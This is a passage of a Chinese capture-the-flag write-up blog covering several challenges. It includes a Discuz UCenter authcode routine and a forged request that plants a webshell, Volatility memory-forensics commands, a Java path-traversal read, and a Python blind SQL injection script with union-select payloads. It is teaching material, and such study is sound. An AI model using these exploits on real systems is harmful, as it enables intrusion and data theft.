+<p>  <code>$cryptkey = $keya.md5($keya.$keyc);</code><br>  <code>$key_length = strlen($cryptkey);</code></p>
+<p>  <code>$string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</code><br>  <code>$string_length = strlen($string);</code></p>
+<p>  <code>$result = &#39;&#39;;</code><br>  <code>$box = range(0, 255);</code></p>
+<p>  <code>$rndkey = array();</code><br>  <code>for($i = 0; $i &lt;= 255; $i++) &#123;</code><br>    <code>$rndkey[$i] = ord($cryptkey[$i % $key_length]);</code><br>  <code>&#125;</code></p>
+<p>  <code>for($j = $i = 0; $i &lt; 256; $i++) &#123;</code><br>    <code>$j = ($j + $box[$i] + $rndkey[$i]) % 256;</code><br>    <code>$tmp = $box[$i];</code><br>    <code>$box[$i] = $box[$j];</code><br>    <code>$box[$j] = $tmp;</code><br>  <code>&#125;</code></p>
+<p>  <code>for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</code><br>    <code>$a = ($a + 1) % 256;</code><br>    <code>$j = ($j + $box[$a]) % 256;</code><br>    <code>$tmp = $box[$a];</code><br>    <code>$box[$a] = $box[$j];</code><br>    <code>$box[$j] = $tmp;</code><br>    <code>$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</code><br>  <code>&#125;</code></p>
+<p>  <code>if($operation == &#39;DECODE&#39;) &#123;</code><br>    <code>if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</code><br>      <code>return substr($result, 26);</code><br>    <code>&#125; else &#123;</code><br>      <code>return &#39;&#39;;</code><br>    <code>&#125;</code><br>  <code>&#125; else &#123;</code><br>    <code>return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result));</code><br>  <code>&#125;</code><br><code>&#125;</code><br><code>?&gt;</code></p>
+<p>3.带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常)：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697637712450.png" alt="uTools_1697637712450" style="zoom:50%;">
+
+<p>请求包如下（注意，code需要替换成上边代码跑出来的值）：</p>
+<p><code>GET /api/uc.php?code=3261GqyMWCKWcBrmvnAR%2fMsytT4CniPufkSLlq8qgFENXGRbemdZM%2fO0tQ5UDOmm0gkfa3FziIaBUL6vu2s HTTP/1.1</code><br><code>Host: recruit.xxf.world:12088</code><br><code>Upgrade-Insecure-Requests: 1</code><br><code>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36</code><br><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</code><br><code>Accept-Encoding: gzip, deflate</code><br><code>Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8</code><br><code>Connection: close</code><br><code>Content-Length: 127</code></p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</code><br><code>&lt;root&gt;</code><br><code>&lt;item id=&quot;UC_API&quot;&gt;http://recruit.xxf.world:12088/uc_server&lt;/item&gt;</code><br><code>&lt;/root&gt;</code></p>
+<p>4.此时 <code>http://recruit.xxf.world:12088/config/config_ucenter.php</code>就是我们的shell地址，至此getshell结束</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697637783771.png" alt="uTools_1697637783771" style="zoom: 50%;">
+
+<p>5.进入根目录即可查看flag:<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697638243275.png" alt="uTools_1697638243275" style="zoom:33%;"></p>
+<h4 id="BABY-Yulin大超市"><a href="#BABY-Yulin大超市" class="headerlink" title="[BABY]Yulin大超市"></a>[BABY]Yulin大超市</h4><p>题目本身不难，但具体操作比较繁琐，本人并没有全部做完，在此仅提供部分问的具体思路。</p>
+<p>先根据网上的教程，把vmdk装在vmware上，并启动。</p>
+<p><strong>古老内核</strong>：<code>cat /etc/redhat-release</code></p>
+<p><strong>旧日石板</strong>：启动宝塔，进入宝塔页面后点击左侧数据库，查看密码即可</p>
+<p><strong>积尘网页</strong>：进入网页后查看左上角图片即可：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/1695659378523252.png" alt="1695659378523252" style="zoom:50%;">
+
+<p><strong>草灰蛇线</strong>：宝塔页面下载后直接输入命令<code>sha256sum 文件名</code>查看</p>
+<p><strong>链颜如玉</strong>：九尾狐？？？铃兰小姐！！！</p>
+<p><strong>蠕形混沌</strong>：<code>robots.txt</code>了解一下</p>
+<h4 id="Mid-Flag的秘密"><a href="#Mid-Flag的秘密" class="headerlink" title="[Mid]Flag的秘密"></a>[Mid]Flag的秘密</h4><p>本题考查内存取证。</p>
+<p>1.先查看系统信息：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697639514942.png" alt="uTools_1697639514942" style="zoom: 50%;">
+
+<p>2.列出所有进程<code>./volatility -f Dump.raw --profile=Win2003SP1x86 pslist</code>：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697640191995.png" alt="uTools_1697640191995" style="zoom:50%;">
+
+<p>发现notepad与mspaint两个可疑进程。</p>
+<p>3.查看敏感文件：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697640519937.png" alt="uTools_1697640519937" style="zoom:50%;">
+
+<p>4.提取<code>flag.txt</code>，<code>./volatility -f Dump.raw --profile=Win2003SP1x86 dumpfiles -Q 0x060f95d8 --dump-dir=.</code>:</p>
+<p>查看文件内容，发现只有一串数字：<code>70691670853271109852681369060149805628073794361873811272895446916236918634537737802124349238876320719507791592011549293924620129044462418733627976091293608166259846132773460344531124208572819109443346803355186858756595020342162362128266333303983191990037268180788288653684131880322571968703181766706931560885205101352007538331846213613023266466639921413852926790888220321442027205178887750649656145860474727432919114738728373475836303102255486346191364877477938535572331216821254191679994156591750446573045994279439932542854983843840</code></p>
+<p>猜测和题目描述中的数学公式有关，于是进行万能的<code>google</code>，发现这其实是tupper公式中的key。</p>
+<p>5.画图(画图时千万别用github上的脚本，不然会和我一样变得不幸)</p>
+<p>提供一个在线网站：<code>https://tuppers-formula.ovh/</code></p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697641191146.png" alt="uTools_1697641191146" style="zoom:50%;">
+
+<p>翻转180°得flag前半部分：<code>M2tH_1z_</code></p>
+<p>继续推测，notepad中有flag前半部分，那么mspaint中大概率有flag的后半部分。</p>
+<p>6.提取mspaint进程<code>./volatility -f Dump.raw --profile=Win2003SP1x86 memdump -p 2148 --dump-dir=./</code></p>
+<p>，再将dmp后缀改为data，之后用GIMP软件查看，不断改变位移、宽高，即可得真实图像。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1697642119286.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>180°翻转后再镜像翻转即为flag后半部分。</p>
+<p>完整flag为：<code>YulinSec&#123;M2tH_1z_s0_iNtlsTInG&#125;</code></p>
+<h4 id="MID-ezjava"><a href="#MID-ezjava" class="headerlink" title="[MID-]ezjava"></a>[MID-]ezjava</h4><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>首先我们先看访问一下题目网页，由此可知要读取根目录下的flag1和flag2：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699022819537.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>下载题目附件，之后反编译看源码。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699023068928.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>由此可知传参方式：当访问&#x2F;flag1&#x2F;*目录时，会转到&#x2F;tmp&#x2F;*，而tmp目录的上一层目录即为根目录。</p>
+<p>于是我们便可读取flag1:</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699023403377.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+
+
+<h4 id="MID-猫物语"><a href="#MID-猫物语" class="headerlink" title="[MID+]猫物语"></a>[MID+]猫物语</h4><p>这道题属实是思路新奇，是我没见过的类型。</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699024084828.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>先看一下题目描述吧：</p>
+<img src="/2023/10/31/YulinSec-Recruit-2023-WP/uTools_1699023537940.png" alt="uTools_1697642119286" style="zoom:50%;">
+
+<p>根据题目描述我们可以知道本题考查sql注入，且无法使用延时注入和布尔盲注，于是我们可以从“所有内容在原本的基础上都会被加上随机一小段长度的喵！”上下手，增加原本内容的长度，使得返回的“喵”数量超过一定程度，并借此判断是否注入成功。之后的思路就和盲注思路一样了。</p>
+<p>脚本如下：</p>
+<p><code>import requests</code><br><code>import time</code></p>
+<p><code>chars = range(48, 129, 1)</code><br><code>flag = &#39;&#39;</code><br><code>global length</code></p>
+<p><code>length = 50</code></p>
+<p><code>close = &quot;?id=-1&quot;</code><br><code>for i in range(1, length + 1):</code><br>    <code>for char1 in chars:</code><br>        <code>url = &quot;http://124.220.110.41:20001/&quot;</code><br>        <code>payload = &quot; union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,repeat(&#39;a&#39;,50),1)--+&quot; % (</code><br>        <code>i, char1)</code><br>        <code>url = url + close + payload</code><br>        <code>res = requests.get(url)</code><br>        <code>print(url + &#39;\n&#39;)</code><br>        <code>if &quot;喵&quot; * 50 in res.text:</code><br>            <code>flag = flag + chr(char1)</code><br>            <code>print(&quot;flag: &quot; + flag)</code><br>            <code>break</code><br>        <code>print(&quot;flag: &quot; + flag)</code><br><code>print(&#39;flag:&#39;, flag)</code></p>
+<p>payload请自行根据想要得到的内容进行更改。</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Narcherの小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Narcher Alter
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
